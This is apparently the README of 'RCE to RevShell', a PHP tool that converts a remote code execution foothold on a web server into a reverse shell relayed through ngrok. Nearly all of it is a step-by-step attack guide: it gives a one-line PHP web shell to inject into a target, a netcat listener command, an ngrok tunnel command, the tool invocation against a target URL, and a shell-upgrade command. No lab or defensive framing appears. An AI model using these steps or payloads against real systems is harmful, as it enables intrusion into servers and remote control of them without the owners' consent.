```
_____   _____ ______   _          _____             _____ _          _ _    
|  __ \ / ____|  ____| | |        |  __ \           / ____| |        | | |  
| |__) | |    | |__    | |_ ___   | |__) |_____   _| (___ | |__   ___| | |  
|  _  /| |    |  __|   | __/ _ \  |  _  // _ \ \ / /\___ \| '_ \ / _ \ | |  
| | \ \| |____| |____  | || (_) | | | \ \  __/\ V / ____) | | | |  __/ | |  
|_|  \_\______|______|  \__\___/  |_|  \_\___| \_/ |_____/|_| |_|\___|_|_|
by fami0110
```

> **Usage:** `php httpRceToNgrokReverse.php [-u URL] [-q PARAM] [-p PORT] [-h] [-D]`

## How To Get the Shell
To get the reverse shell, you must following this steps before run this script :

1. Inject PHP RCE command into the target. Make sure the RCE is working properly.
> **Example:**  `if (isset($_GET['cmd'])) shell_exec($_GET['cmd']);`

2. Make the tcp listener in your computer using nc. (This will be your reverse shell)
> **Example:**  `nc -lvnp 4444`

3. Make sure that you already installed ngrok, so your computer can reach by the target publicly.
> **Install:**  [https://ngrok.com/download](https://ngrok.com/download)

4. Make tcp tunnel connection into the listen port that you've already set. 
> **Example:**  `ngrok tcp 4444`

5. Run this program.
> **Example:**  `php httpRceToNgrokReverse.php -u https://target.com -q cmd -p 4444`

6. (optional) To upgrade the shell, you can run this command.
> **Command:**  `SHELL=/bin/bash script -q /dev/null`
